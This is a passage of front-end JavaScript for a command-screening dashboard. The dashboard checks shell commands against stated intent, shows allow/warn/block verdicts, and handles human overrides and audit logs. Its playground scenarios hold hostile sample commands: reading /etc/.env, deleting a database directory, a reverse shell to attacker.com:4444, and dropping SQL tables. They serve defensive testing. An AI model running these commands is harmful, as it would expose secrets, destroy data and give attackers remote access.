/* Dashboard logic — depends on app.js (window.rk) */
(function () {
  // ── Preview Mode Initialization ──────────────────────────────────────────
  const urlParams = new URLSearchParams(window.location.search);
  if (false /* preview disabled */) {
    sessionStorage.setItem('rk_preview_mode', 'true');
    if (!sessionStorage.getItem('rk_api_key')) {
      sessionStorage.setItem('rk_api_key', 'rk_preview_demo_key_active');
    }
  }

  const actionParam = urlParams.get('action');
  const actionIdParam = urlParams.get('action_id');
  const tokenParam = urlParams.get('token');
  const expiresParam = urlParams.get('expires');
  
  if (actionParam && actionIdParam && tokenParam && expiresParam) {
    // Show a loading overlay immediately
    const overlay = document.createElement('div');
    overlay.className = 'modal-backdrop show';
    overlay.innerHTML = `<div class="modal" style="text-align: center;">
      <h3 style="margin-bottom: 16px;">Processing...</h3>
      <p>Validating cryptographic token and submitting decision.</p>
    </div>`;
    document.body.appendChild(overlay);

    const decision = actionParam === 'approve' ? 'approved' : 'rejected';
    
    rk.call('/v1/override/direct', {
      method: 'POST',
      body: JSON.stringify({
        action_id: actionIdParam,
        decision: decision,
        token: tokenParam,
        expires: expiresParam
      })
    }).then(res => {
      if (res.ok) {
        overlay.innerHTML = `<div class="modal" style="text-align: center;">
          <h3 style="margin-bottom: 16px; color: var(--ok);">Success</h3>
          <p>Action has been ${decision} via Discord link.</p>
          <button class="btn btn-sm" onclick="window.location.href='/dashboard'" style="margin-top: 16px;">Continue to Dashboard</button>
        </div>`;
      } else {
        overlay.innerHTML = `<div class="modal" style="text-align: center;">
          <h3 style="margin-bottom: 16px; color: var(--block);">Error</h3>
          <p>${esc(res.body?.detail || 'Failed to process override')}</p>
          <button class="btn btn-sm danger" onclick="window.location.href='/dashboard'" style="margin-top: 16px;">Back to Dashboard</button>
        </div>`;
      }
    }).catch(err => {
      overlay.innerHTML = `<div class="modal" style="text-align: center;">
        <h3 style="margin-bottom: 16px; color: var(--block);">Network Error</h3>
        <p>Failed to reach the API.</p>
        <button class="btn btn-sm danger" onclick="window.location.href='/dashboard'" style="margin-top: 16px;">Back to Dashboard</button>
      </div>`;
    });
    
    // Stop execution so the rest of the dashboard doesn't load underneath the modal
    return;
  }

  if (!rk.requireKey()) return;
  const esc = rk.htmlEscape;

  function formatVerdict(verdict) {
    if (!verdict) return '—';
    if (verdict === 'WARN_APPROVED') return 'WARNING(APPROVED)';
    if (verdict === 'WARN_REJECTED') return 'WARNING(REJECTED)';
    if (verdict === 'WARN') return 'WARN (PENDING)';
    return verdict;
  }

  function verdictClass(verdict) {
    if (!verdict) return 'muted';
    if (verdict === 'WARN_APPROVED') return 'warn-approved';
    if (verdict === 'WARN_REJECTED') return 'warn-rejected';
    return verdict.toLowerCase();
  }

  // Show preview watermark if in preview mode
  if (sessionStorage.getItem('rk_preview_mode') === 'true') {
    const wm = document.getElementById('previewWatermark');
    if (wm) wm.hidden = false;
  }

  // ── Tab switching ──────────────────────────────────────────────────────────  // • Tab switching •
  // Only rk-nav-link buttons with a data-tab attribute switch panels.
  // rk-nav-link anchors without data-tab are external navigations and
  // must not steal focus from the currently-active tab.
  const tabs   = document.querySelectorAll('.rk-nav-link[data-tab]');
  const panels = document.querySelectorAll('.panel');
  const crumbCur = document.getElementById('crumbCur');

  function activateTab(tabEl) {
    if (!tabEl || !tabEl.dataset.tab) return;
    tabs.forEach(x => x.classList.remove('active'));
    panels.forEach(x => x.classList.remove('active'));
    tabEl.classList.add('active');
    const target = document.querySelector(`[data-panel="${tabEl.dataset.tab}"]`);
    if (target) target.classList.add('active');
    if (crumbCur) crumbCur.textContent = (tabEl.textContent || '').trim();
    history.replaceState(null, '', '#'+tabEl.dataset.tab);
  }

  tabs.forEach(t => t.addEventListener('click', (ev) => {
    if (!t.dataset.tab) return;
    // If this is an <a> being used as a tab, prevent default navigation.
    if (t.tagName === 'A') ev.preventDefault();
    activateTab(t);
  }));

  const hashTab = location.hash ? location.hash.replace('#', '') : '';
  const initialTab = Array.from(tabs).find(t => t.dataset.tab === hashTab) || tabs[0];
  if (initialTab) activateTab(initialTab);

  // ── Logout / wipe ──────────────────────────────────────────────────────────
  const logoutBtn = document.getElementById('logoutBtn');
  if (logoutBtn) logoutBtn.onclick = rk.logout;

  const wipeBtn = document.getElementById('wipeBtn');
  if (wipeBtn) {
    wipeBtn.onclick = () => {
      rk.logout();
    };
  }

  document.getElementById('saveWebhookBtn').onclick = async () => {
    const url = document.getElementById('discordWebhookUrl').value.trim();
    const btn = document.getElementById('saveWebhookBtn');
    btn.textContent = "Saving...";
    btn.disabled = true;
    try {
      const res = await rk.call('/v1/webhook', {
        method: 'POST',
        body: JSON.stringify({ url: url })
      });
      if (res.ok) {
        showToast("Discord integration saved successfully.", "success");
        if (me) me.discord_webhook = url;
      } else {
        showToast("Failed to save webhook: " + res.body?.detail, "danger");
      }
    } catch (e) {
      showToast("Network error saving webhook.", "danger");
    } finally {
      btn.textContent = "Save Webhook";
      btn.disabled = false;
    }
  };

  document.getElementById('testWebhookBtn').onclick = async () => {
    const url = document.getElementById('discordWebhookUrl').value.trim();
    if (!url) {
      showToast("Please enter a webhook URL first.", "danger");
      return;
    }
    const btn = document.getElementById('testWebhookBtn');
    btn.textContent = "Sending...";
    btn.disabled = true;
    try {
      const res = await rk.call('/v1/webhook/test', {
        method: 'POST',
        body: JSON.stringify({ url: url })
      });
      if (res.ok) {
        showToast("Test alert sent to Discord.", "success");
      } else {
        showToast("Failed to send test alert: " + res.body?.detail, "danger");
      }
    } catch (e) {
      showToast("Network error sending test alert.", "danger");
    } finally {
      btn.textContent = "Send Test Alert";
      btn.disabled = false;
    }
  };

  // Quick Verify in Audit Log
  const qvBtn = document.getElementById('quickVerifyBtn');
  if (qvBtn) {
    qvBtn.onclick = async () => {
      const cmd = document.getElementById('quickVerifyCmd').value.trim();
      const intent = document.getElementById('quickVerifyIntent').value.trim();
      if (!cmd) {
        showToast('Please enter a command', 'danger');
        return;
      }
      qvBtn.disabled = true;
      qvBtn.textContent = 'Verifying...';
      const resContainer = document.getElementById('quickVerifyResult');
      resContainer.style.display = 'none';

      try {
        const res = await rk.call('/v1/check', {
          method: 'POST',
          body: JSON.stringify({ command: cmd, prime_intent: intent })
        });
        resContainer.style.display = 'block';
        if (res.ok) {
          const v = res.body.verdict;
          const color = v === 'ALLOW' ? 'var(--ok)' : (v === 'BLOCK' ? 'var(--block)' : 'var(--warn)');
          resContainer.innerHTML = `<div style="padding: 12px; background: rgba(255,255,255,0.03); border-left: 3px solid ${color};">
            <strong>Verdict: <span style="color: ${color}">${v}</span></strong><br/>
            <span class="muted">Confidence: ${(res.body.confidence * 100).toFixed(0)}%</span><br/>
            <span class="muted" style="margin-top: 8px; display: block;">${rk.htmlEscape(res.body.evidence[0] || '')}</span>
          </div>`;
          loadDashboard(); // Refresh audit log table to show the new entry
        } else {
          resContainer.innerHTML = `<span style="color: var(--block)">Error: ${rk.htmlEscape(res.body?.detail || 'Failed')}</span>`;
        }
      } catch (e) {
        resContainer.innerHTML = `<span style="color: var(--block)">Network error</span>`;
      } finally {
        qvBtn.disabled = false;
        qvBtn.textContent = 'Verify';
      }
    };
  }

  // ── Toasts ───────────────────────────────────────────────────────────────
  const stack = document.getElementById('toastStack');
  function _emitToast(kind, title, msg) {
    if (!stack) return;
    const el = document.createElement('div');
    el.className = 'toast ' + (kind || 'info');
    el.innerHTML = `<div style="flex:1"><strong>${esc(title)}</strong><span>${esc(msg || '')}</span></div>`;
    stack.appendChild(el);
    setTimeout(() => el.classList.add('fade-out'), 4200);
    setTimeout(() => el.remove(), 4500);
  }
  const toast = _emitToast;
  window.toast = _emitToast;
  // showToast supports both legacy signatures: (msg, kind) and (title, msg, kind).
  function showToast(a, b, c) {
    if (c !== undefined) {
      _emitToast(c, a, b);
    } else {
      _emitToast(b || 'info', 'Notice', a);
    }
  }
  window.showToast = showToast;

  // ── FAQ accordion ──────────────────────────────────────────────────────────
  document.querySelectorAll('.faq-q').forEach(btn => {
    btn.addEventListener('click', () => btn.parentElement.classList.toggle('open'));
  });

  // ── State + render ─────────────────────────────────────────────────────────
  let me = null, audit = [];
  // Track locally-resolved WARN action_ids so they dismiss instantly
  // before the async refresh() re-fetches the updated audit array.
  const _resolvedWarns = new Set();

  function renderWarningBar() {
    const bar = document.getElementById('warningBar');
    if (!me) { bar.hidden = true; return; }
    if (me.status === 'suspended') {
      bar.className = 'warning-bar danger show';
      bar.textContent = 'Your account is SUSPENDED. API calls will be rejected. Contact support.';
      return;
    }
    if (me.low_credits) {
      bar.className = 'warning-bar warn show';
      bar.textContent = `Low credits: only ${rk.fmtNum(me.credits_remaining)} left (${me.pct_used}% used).`;
      return;
    }
    bar.hidden = true;
  }

  function renderOverview() {
    if (!me) return;
    document.getElementById('userBadge').textContent =
      (me.name || 'client') + ' · ' + (me.key_masked || '');
    document.getElementById('ov-plan').textContent  = me.plan || '—';
    document.getElementById('ov-status').textContent = me.status || '—';
    document.getElementById('ov-used').textContent  = rk.fmtNum(me.credits_used);
    document.getElementById('ov-limit').textContent = ' / ' + rk.fmtNum(me.credits_limit);
    document.getElementById('ov-rem').textContent   = rk.fmtNum(me.credits_remaining);
    document.getElementById('ov-pct').textContent   = (me.pct_used || 0) + '% used';
    document.getElementById('ov-bar').style.width   = Math.min(100, me.pct_used || 0) + '%';
    document.getElementById('ov-bar').className     = 'fill ' +
      (me.pct_used > 90 ? 'block' : me.pct_used > 75 ? 'warn' : 'ok');
    document.getElementById('ov-rem-warn').textContent =
      me.low_credits ? 'Low — top up soon' : 'Healthy';

    const counts = { ALLOW: 0, WARN: 0, BLOCK: 0 };
    audit.forEach(e => {
      let v = e.verdict;
      if (v === 'WARN_APPROVED' || v === 'WARN_REJECTED') v = 'WARN';
      if (counts[v] !== undefined) counts[v]++;
    });
    document.getElementById('ov-calls').textContent = audit.length;
    document.getElementById('ov-allow').textContent = counts.ALLOW + ' allow';
    document.getElementById('ov-warn').textContent  = counts.WARN  + ' warn';
    document.getElementById('ov-block').textContent = counts.BLOCK + ' block';

    const tbody = document.getElementById('ov-recent');
    if (tbody) {
      tbody.innerHTML = '';
      audit.slice(0, 8).forEach(e => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
          <td>${esc(rk.fmtTime(e.ts))}</td>
          <td><span class="pill ${verdictClass(e.verdict)}">${esc(formatVerdict(e.verdict))}</span></td>
          <td><code>${esc(e.command || '')}</code></td>
          <td>${esc(e.cost ?? '—')}</td>`;
        tbody.appendChild(tr);
      });
      if (!audit.length) tbody.innerHTML = '<tr><td colspan="4" class="muted">no activity yet</td></tr>';
    }

    const pendingList = document.getElementById('ov-pending-list');
    const pendingCard = document.getElementById('pendingAlertsCard');
    if (pendingList && pendingCard) {
      // FIX: Filter out locally-resolved WARNs immediately so card dismisses
      // without waiting for the async API re-fetch to complete.
      const pendingWarns = audit.filter(e => e.verdict === 'WARN' && !_resolvedWarns.has(e.action_id));
      pendingCard.style.display = 'block';
      if (pendingWarns.length > 0) {
        pendingList.innerHTML = '';
        pendingWarns.forEach(e => {
          const div = document.createElement('div');
          div.style.padding = '12px';
          div.style.background = 'var(--bg-hover)';
          div.style.border = '1px solid var(--border)';
          div.style.borderRadius = '6px';
          div.style.display = 'flex';
          div.style.flexDirection = 'column';
          div.style.gap = '8px';
          
          const urlParams = new URLSearchParams(window.location.search);
          const isTargeted = urlParams.get('action_id') === e.action_id;
          if (isTargeted) {
            div.style.borderColor = 'var(--warn)';
            div.style.boxShadow = '0 0 0 1px var(--warn)';
          }

          // Display actual command/intent; show hash as subtle proof annotation
          const cmdDisplay = e.command && e.command.startsWith('[redacted]')
            ? `<span style="font-size:11px;color:var(--text-muted);font-family:var(--font-mono);" title="Zero-retention: command stored as SHA-256 fingerprint">[zero-retention proof] <em>${esc(e.command.replace('[redacted] ',''))}</em></span>`
            : `<code style="font-size:13px;color:var(--text);">${esc(e.command || '—')}</code>`;
          const intentDisplay = e.prime_intent && e.prime_intent.startsWith('[redacted]')
            ? `<span style="font-size:11px;color:var(--text-muted);font-family:var(--font-mono);" title="Zero-retention: intent stored as SHA-256 fingerprint">[proof] ${esc(e.prime_intent.replace('[redacted] ',''))}</span>`
            : esc(e.prime_intent || '—');

          div.innerHTML = `
            <div style="display: flex; justify-content: space-between; align-items: flex-start;">
              ${cmdDisplay}
              <span class="muted" style="font-size: 11px;">${esc(rk.fmtTime(e.ts))}</span>
            </div>
            <div style="font-size: 13px;" class="muted">Intent: <em>${intentDisplay}</em></div>
            <div style="display: flex; gap: 8px; margin-top: 4px;">
              <button class="primary btn-sm" onclick="handleOverride('${e.action_id}', 'approved')">Approve Action</button>
              <button class="danger btn-sm" onclick="handleOverride('${e.action_id}', 'rejected')">Block Action</button>
            </div>
          `;
          pendingList.appendChild(div);
        });
      } else {
        pendingList.innerHTML = '<div style="padding: 24px; text-align: center; color: var(--text-muted); font-size: 14px; background: var(--bg-hover); border: 1px dashed var(--border); border-radius: 6px;">No pending actions. You\'re all caught up! ✓</div>';
      }
    }

    const eh = document.getElementById('engineHealth');
    if (eh) eh.innerHTML = '<span class="dot ok" style="margin-right:0"></span> Engine · operational';
  }

  function renderUsage() {
    if (!me) return;
    document.getElementById('us-used').textContent  = rk.fmtNum(me.credits_used);
    document.getElementById('us-limit').textContent = ' / ' + rk.fmtNum(me.credits_limit);
    document.getElementById('us-pct').textContent   = (me.pct_used || 0) + '%';
    document.getElementById('us-plan').textContent  = me.plan || '—';
    document.getElementById('us-status').textContent = me.status || '—';
    const bar = document.getElementById('us-bar');
    if (bar) {
      bar.style.width = Math.min(100, me.pct_used || 0) + '%';
      bar.className = 'fill ' + (me.pct_used > 90 ? 'block' : me.pct_used > 75 ? 'warn' : 'ok');
    }

    const tbody = document.getElementById('us-topups');
    if (tbody) {
      const log = me.top_up_log || [];
      if (!log.length) {
        tbody.innerHTML = '<tr><td colspan="3" class="empty-state" style="padding: 24px;"><span class="empty-ic">Empty</span><h4>No top-ups recorded</h4></td></tr>';
      } else {
        tbody.innerHTML = log.map(t => `
          <tr><td>${esc(rk.fmtTime(t.ts))}</td><td>+${esc(rk.fmtNum(t.amount))}</td><td>${esc(t.note || '')}</td></tr>
        `).join('');
      }
    }

    const counts = { ALLOW: 0, WARN: 0, BLOCK: 0 };
    audit.forEach(e => {
      let v = e.verdict;
      if (v === 'WARN_APPROVED' || v === 'WARN_REJECTED') v = 'WARN';
      if (counts[v] !== undefined) counts[v]++;
    });
    const total = Math.max(1, counts.ALLOW + counts.WARN + counts.BLOCK);
    if (document.getElementById('us-seg-ok')) {
      document.getElementById('us-seg-ok').style.width    = (counts.ALLOW / total * 100) + '%';
      document.getElementById('us-seg-warn').style.width  = (counts.WARN  / total * 100) + '%';
      document.getElementById('us-seg-block').style.width = (counts.BLOCK / total * 100) + '%';
    }
  }

  function renderAudit() {
    const v   = document.getElementById('auditVerdict').value;
    const q   = document.getElementById('auditSearch').value.toLowerCase();
    const rows = audit.filter(e =>
      (!v || e.verdict === v || (v === 'WARN' && (e.verdict === 'WARN_APPROVED' || e.verdict === 'WARN_REJECTED'))) &&
      (!q || (e.command || '').toLowerCase().includes(q))
    );
    const tbody = document.getElementById('audit-rows');
    if (!tbody) return;
    if (!rows.length) {
      tbody.innerHTML = '<tr><td colspan="7" class="muted">no entries</td></tr>';
      return;
    }
    tbody.innerHTML = '';
    rows.forEach(e => {
      const tr = document.createElement('tr');
      tr.style.cursor = 'pointer';
      // FIX: Style [redacted] zero-retention hashes as intentional proof data
      function fmtField(val) {
        if (!val) return '—';
        if (val.startsWith('[redacted]')) {
          const hash = val.replace('[redacted] ', '');
          return `<span style="font-family:var(--font-mono);font-size:10px;color:var(--text-muted);" title="Zero-retention policy: stored as SHA-256 fingerprint\n${hash}">[redacted] ${hash.slice(0,20)}…</span>`;
        }
        return `<code>${esc(val)}</code>`;
      }
      tr.innerHTML = `
        <td>${esc(rk.fmtTime(e.ts))}</td>
        <td><span class="pill ${verdictClass(e.verdict)}">${esc(formatVerdict(e.verdict))}</span></td>
        <td>${esc(e.confidence ?? '—')}</td>
        <td>${fmtField(e.command)}</td>
        <td>${fmtField(e.prime_intent)}</td>
        <td>${esc(e.cost ?? '—')}</td>
        <td><code class="hash" title="${esc(e.proof_hash || '')}">${esc((e.proof_hash || '').slice(0, 10))}…</code></td>
      `;
      tr.onclick = () => showAuditDetail(e);
      tbody.appendChild(tr);
    });
  }

  function renderProfile() {
    if (!me) return;
    document.getElementById('pr-name').textContent    = me.name    || '—';
    document.getElementById('pr-email').textContent   = me.email   || '—';
    document.getElementById('pr-company').textContent = me.company || '—';
    document.getElementById('pr-plan').textContent    = me.plan    || '—';
    document.getElementById('pr-status').textContent  = me.status  || '—';
    document.getElementById('pr-created').textContent = rk.fmtTime(me.created_at);
    document.getElementById('pr-expires').textContent = me.expires_at ? rk.fmtTime(me.expires_at) : 'never';
    document.getElementById('pr-key').textContent     = me.key_masked || '—';

    const webhookInput = document.getElementById('discordWebhookUrl');
    if (webhookInput && document.activeElement !== webhookInput) {
      webhookInput.value = me.discord_webhook || '';
    }
  }

  // ── Audit Detail Modal ─────────────────────────────────────────────────────
  // ── JSON Syntax Highlighting ─────────────────────────────────────────────
  function syntaxHighlightJSON(json) {
    if (typeof json !== 'string') json = JSON.stringify(json, null, 2);
    json = json.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
    return json.replace(
      /("(\\u[a-fA-F0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?)/g,
      function (match) {
        var cls = 'json-number';
        if (/^"/.test(match)) {
          if (/:$/.test(match)) {
            cls = 'json-key';
          } else {
            cls = 'json-string';
          }
        } else if (/true|false/.test(match)) {
          cls = 'json-boolean';
        } else if (/null/.test(match)) {
          cls = 'json-null';
        }
        return '<span class="' + cls + '">' + match + '</span>';
      }
    );
  }

  window.showAuditDetail = function(entry) {
    const modal = document.getElementById('auditDetailModal');
    const content = document.getElementById('auditDetailContent');

    const prevHashEntry = Array.isArray(entry.evidence)
      ? entry.evidence.find(e => e.startsWith('prev_hash:'))
      : null;
    const prevHash = prevHashEntry ? prevHashEntry.split(':')[1] : null;

    const cleanEvidence = Array.isArray(entry.evidence)
      ? entry.evidence.filter(e => !e.startsWith('prev_hash:'))
      : [];
    
    const html = `
      <div class="audit-detail-section">
        <h4>Verdict</h4>
        <div class="detail-row">
          <div class="label">Status</div>
          <div class="value"><span class="pill ${verdictClass(entry.verdict)}">${esc(formatVerdict(entry.verdict))}</span></div>
        </div>
        <div class="detail-row">
          <div class="label">Confidence</div>
          <div class="value">${((entry.confidence || 0) * 100).toFixed(1)}%</div>
        </div>
      </div>

      <div class="audit-detail-section">
        <h4>Command Analysis</h4>
        <div class="detail-row">
          <div class="label">Command</div>
          <div class="value"><code>${esc(entry.command || '—')}</code></div>
        </div>
        <div class="detail-row">
          <div class="label">Prime Intent</div>
          <div class="value">${esc(entry.prime_intent || '—')}</div>
        </div>
      </div>

      <div class="audit-detail-section">
        <h4>Execution Details</h4>
        <div class="detail-row">
          <div class="label">Timestamp</div>
          <div class="value">${rk.fmtTime(entry.ts)}</div>
        </div>
        <div class="detail-row">
          <div class="label">Credits Used</div>
          <div class="value">${esc(entry.cost ?? '—')}</div>
        </div>
        <div class="detail-row">
          <div class="label">Action ID</div>
          <div class="value"><code>${esc(entry.action_id || '—')}</code></div>
        </div>
      </div>

      <div class="audit-detail-section">
        <h4>Evidence</h4>
        <div class="detail-row">
          <div class="label">Signals</div>
          <div class="value">
            ${cleanEvidence.length 
              ? cleanEvidence.map(e => `<div style="margin-bottom: 6px;">• ${esc(e)}</div>`).join('')
              : 'No evidence recorded'}
          </div>
        </div>
      </div>

      <div class="audit-detail-section">
        <h4>Cryptographic Proof Chain</h4>
        ${entry.ed25519_signature ? `<div style="display:inline-flex;align-items:center;gap:6px;padding:4px 10px;background:rgba(0,255,153,0.08);border:1px solid rgba(0,255,153,0.25);border-radius:4px;margin-bottom:12px;">
          <span style="color:#00ff99;font-size:11px;">●</span>
          <span style="font-family:var(--font-mono);font-size:10px;color:#00ff99;font-weight:600;letter-spacing:.05em;">ED25519 SIGNED</span>
          <span style="font-size:10px;color:var(--text-muted);">· Publicly verifiable without API key</span>
        </div>` : ''}
        <div class="detail-row" style="flex-direction: column; align-items: stretch; gap: 8px;">
          <div style="word-break: break-all; font-family: var(--font-mono); font-size: 11px; background: rgba(0,0,0,0.15); padding: 8px 10px; border-radius: 4px; border-left: 2px solid var(--border);">
            <strong style="color: var(--text-muted); font-size: 9px; text-transform: uppercase;">Previous Block Hash</strong><br/>
            <span>${esc(prevHash || 'Genesis (Root block)')}</span>
          </div>
          <div style="word-break: break-all; font-family: var(--font-mono); font-size: 11px; background: rgba(0,255,204,0.05); padding: 8px 10px; border-radius: 4px; border-left: 2px solid var(--brand);">
            <strong style="color: var(--brand); font-size: 9px; text-transform: uppercase;">Current Proof Hash (SHA-256)</strong><br/>
            <span>${esc(entry.proof_hash || 'N/A')}</span>
          </div>
          ${entry.ed25519_signature ? `<div style="word-break: break-all; font-family: var(--font-mono); font-size: 11px; background: rgba(0,255,153,0.04); padding: 8px 10px; border-radius: 4px; border-left: 2px solid #00ff99;">
            <strong style="color: #00ff99; font-size: 9px; text-transform: uppercase;">Ed25519 Signature</strong><br/>
            <span style="color:var(--text-muted);">${esc(entry.ed25519_signature)}</span>
          </div>` : ''}
        </div>
      </div>


      <div class="audit-detail-section">
        <h4 class="raw-toggle-header">
          Full Raw Payload
          <button class="raw-toggle-btn" type="button" onclick="this.parentElement.parentElement.querySelector('.raw-payload-wrap').classList.toggle('expanded'); this.textContent = this.textContent.trim() === '▸ Expand' ? '▾ Collapse' : '▸ Expand';">▸ Expand</button>
        </h4>
        <div class="raw-payload-wrap">
          <pre class="raw-payload output">${syntaxHighlightJSON(entry)}</pre>
        </div>
      </div>
    `;
    
    content.innerHTML = html;
    modal.classList.add('show');
  };

  document.getElementById('auditDetailModal').addEventListener('click', (e) => {
    if (e.target.id === 'auditDetailModal') e.target.classList.remove('show');
  });

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
      document.getElementById('auditDetailModal').classList.remove('show');
    }
  });

  // ── Playground Logic ───────────────────────────────────────────────────────
  const SCENARIOS = [
    { cmd: 'ls /var/log',                                   intent: 'organise log files into dated folders' },
    { cmd: 'cat /etc/.env',                                 intent: 'show me the last 10 lines of the error log' },
    { cmd: "rm -rf /var/lib/db && echo 'done'",             intent: 'summarise the app logs' },
    { cmd: 'bash -i >& /dev/tcp/attacker.com/4444 0>&1',    intent: 'check server connectivity' },
    { cmd: 'DROP TABLE users; DELETE FROM transactions;',   intent: 'run the database migration script' },
  ];

  document.querySelectorAll('.scenario-chips .chip').forEach(c => {
    c.addEventListener('click', () => {
      const s = SCENARIOS[+c.dataset.scn] || SCENARIOS[0];
      document.getElementById('dashPg-cmd').value    = s.cmd;
      document.getElementById('dashPg-intent').value = s.intent;
    });
  });

  const banner   = document.getElementById('dashPg-verdictBanner');
  const actions  = document.getElementById('dashPg-reviewActions');
  const decision = document.getElementById('dashPg-reviewDecision');
  const pgOut    = document.getElementById('dashPg-out');
  const pgStructured = document.getElementById('dashPg-structured');
  const pgRawContainer = document.getElementById('dashPg-raw-container');
  const pgRawToggle = document.getElementById('dashPg-raw-toggle');
  
  let currentActionId = null;

  pgRawToggle.onclick = () => {
    if (pgOut.hidden) {
      pgOut.hidden = false;
      pgRawToggle.textContent = 'Hide Raw JSON';
    } else {
      pgOut.hidden = true;
      pgRawToggle.textContent = 'Show Raw JSON';
    }
  };

  function paintBanner(verdict, evidence) {
    banner.className = 'verdict-banner';
    decision.className = 'review-decision';
    actions.classList.remove('show');
    if (!verdict) return;
    const map = {
      ALLOW: { label: 'Basin A · action permitted',            cls: 'vb-allow', icon: '+' },
      WARN:  { label: 'Suspicious trajectory · review needed', cls: 'vb-warn',  icon: '!' },
      BLOCK: { label: 'Reflexive collapse · action blocked',   cls: 'vb-block', icon: '×' },
    };
    const m = map[verdict] || map.WARN;
    banner.classList.add('show', m.cls);
    banner.innerHTML = `
      <div class="icon" data-icon="${m.icon}"></div>
      <div class="text">
        <small>verdict</small>
        ${m.label}
      </div>
      <div style="font-family: var(--font-mono); font-size: 11px; opacity: .8; letter-spacing: .04em;">
        ${esc(Array.isArray(evidence) && evidence.length ? evidence.slice(0,2).join(' · ') : '—')}
      </div>
    `;
    if (verdict === 'WARN') actions.classList.add('show');
  }

  function renderStructuredResponse(container, body) {
    container.hidden = false;
    const evidenceHtml = Array.isArray(body.evidence) && body.evidence.length
      ? `<ul class="pg-evidence-list">${body.evidence.map(e => `<li>${esc(e)}</li>`).join('')}</ul>`
      : `<ul class="pg-evidence-list empty"><li>No malicious divergence evidence found in system state.</li></ul>`;
      
    container.innerHTML = `
      <h4 style="margin: 0 0 16px 0; font-family: var(--font-mono); text-transform: uppercase; font-size: 11px; color: var(--brand); letter-spacing: 0.05em;">Causal Analysis Summary</h4>
      <div class="pg-response-grid">
        <div class="pg-metric">
          <div class="label">Action ID</div>
          <div class="value"><code>${esc(body.action_id || 'N/A')}</code></div>
        </div>
        <div class="pg-metric">
          <div class="label">Latency</div>
          <div class="value">${esc(body.latency_ms ?? '—')} ms</div>
        </div>
        <div class="pg-metric">
          <div class="label">Confidence</div>
          <div class="value">${((body.confidence || 0) * 100).toFixed(1)}%</div>
        </div>
        <div class="pg-metric">
          <div class="label">Worlds Evaluated</div>
          <div class="value">${esc(body.worlds_evaluated ?? '—')} / 5</div>
        </div>
        <div class="pg-metric">
          <div class="label">Basin B Count</div>
          <div class="value">${esc(body.worlds_in_basin_b ?? '—')}</div>
        </div>
        <div class="pg-metric">
          <div class="label">Max Divergence</div>
          <div class="value">${esc(body.max_divergence ?? '—')}</div>
        </div>
      </div>
      <div class="pg-metric" style="margin-top: 12px; border-left-color: var(--accent);">
        <div class="label">Causal Evidence & Threat Signals</div>
        <div class="value" style="font-weight: 500; font-size: 13px; margin-top: 6px;">${evidenceHtml}</div>
      </div>
      <div class="pg-metric" style="margin-top: 12px; border-left-color: var(--info);">
        <div class="label">Cryptographic Proof Seal</div>
        <div class="value" style="font-family: var(--font-mono); font-size: 10px; word-break: break-all; color: var(--text-soft); font-weight: 500;">
          ${esc(body.proof_hash || 'N/A')}
        </div>
      </div>
    `;
  }

  document.getElementById('dashPg-run').onclick = async () => {
    const cmd    = document.getElementById('dashPg-cmd').value.trim();
    const intent = document.getElementById('dashPg-intent').value.trim();
    const $btn   = document.getElementById('dashPg-run');
    if (!cmd || !intent) { window.toast('warn', 'Validation', 'Both fields required'); return; }

    $btn.disabled = true;
    $btn.textContent = 'RUNNING...';
    
    pgStructured.hidden = true;
    pgRawContainer.hidden = true;
    pgOut.hidden = true;
    pgRawToggle.textContent = 'Show Raw JSON';
    paintBanner(null);

    const idemp = rk.newIdempotencyKey();
    const r = await rk.call('/v1/check', {
      method: 'POST',
      headers: { 'Idempotency-Key': idemp },
      body: JSON.stringify({ command: cmd, prime_intent: intent }),
    });

    $btn.disabled = false;
    $btn.innerHTML = '<span>Run simulation</span><span style="font-family: var(--font-mono);">→</span>';

    if (!r.ok) {
      pgRawContainer.hidden = false;
      pgOut.hidden = false;
      pgOut.innerHTML = `<span class="json-null">Error: ${esc(r.body?.detail || 'Simulation failed')}</span>`;
      window.toast('warn', 'Check failed', r.body?.detail || ('HTTP ' + r.status));
      return;
    }

    currentActionId = r.body.action_id;
    renderStructuredResponse(pgStructured, r.body);
    
    pgOut.innerHTML = syntaxHighlightJSON(r.body);
    pgRawContainer.hidden = false;
    
    paintBanner(r.body.verdict, r.body.evidence);
    
    if (sessionStorage.getItem('rk_preview_mode') === 'true') {
      // Insert this new run to mock audit log
      const newEntry = {
        ts: Date.now() / 1000,
        verdict: r.body.verdict,
        confidence: r.body.confidence,
        command: cmd,
        prime_intent: intent,
        cost: r.body.credits_consumed || (is_fast_path_js(cmd) ? 1 : 5),
        proof_hash: r.body.proof_hash,
        action_id: r.body.action_id,
        evidence: r.body.evidence
      };
      audit.unshift(newEntry);
      renderAudit();
      renderOverview();
    } else {
      refresh();
    }
  };

  function is_fast_path_js(cmd) {
    const c = cmd.toLowerCase().trim();
    if (!c) return true;
    if (c.startsWith("ls ") || c === "ls" || c.startsWith("pwd") || c.startsWith("whoami")) return true;
    return false;
  }

  document.getElementById('dashPg-approveBtn').onclick = async () => {
    if (!currentActionId) return;
    
    // Check if this requires a step-up challenge (Tiered Friction)
    const match = audit.find(e => e.action_id === currentActionId);
    if (match) {
      if (match.confidence >= 0.60) {
        // High-confidence WARN -> Full Step-Up Challenge
        if (!confirm("STEP-UP CHALLENGE REQUIRED\n\nThis action was flagged as HIGH RISK (" + Math.round(match.confidence * 100) + "% confidence). Authorizing it will trigger a critical, immutable log line in your security audit. Are you absolutely sure you want to override the Reality Kernel Engine?")) {
          return;
        }
      } else {
        // Low-confidence WARN -> Simple Confirmation
        if (!confirm("⚠ This action was flagged as suspicious by the Reality Kernel. Are you sure you want to override the engine's assessment?")) {
          return;
        }
      }
    }
    
    decision.className = 'review-decision show approved';
    decision.innerHTML = `<span>+</span><span>Manual approval submitted. Verdict override set to WARNING(APPROVED).</span>`;
    actions.classList.remove('show');
    toast('success', 'Action Approved', 'Override record requested.');
    
    if (sessionStorage.getItem('rk_preview_mode') === 'true') {
      if (match) match.verdict = 'WARN_APPROVED';
      renderAudit();
      renderOverview();
      toast('success', 'Override saved', 'Local mock audit logs updated.');
    } else {
      const overrideRes = await rk.call('/v1/override', {
        method: 'POST',
        body: JSON.stringify({ action_id: currentActionId, decision: 'approved' })
      });
      if (overrideRes.ok) {
